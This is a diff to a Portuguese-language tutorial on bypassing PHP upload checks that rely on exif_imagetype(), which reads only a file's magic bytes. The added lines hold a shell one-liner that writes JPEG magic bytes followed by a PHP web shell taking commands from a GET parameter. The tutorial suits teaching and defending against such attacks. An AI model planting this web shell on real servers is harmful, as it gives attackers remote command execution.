@@ -21,6 +21,11 @@ if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
     echo "File is not an image";
 }
 ```
+ou
+
+```shell
+echo -e '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' > shell.php
+```
 
 A função `exif_imagetype()` verifica apenas os **primeiros bytes** do arquivo — os chamados **magic bytes** — para determinar o tipo. Um arquivo JPEG começa com:
 
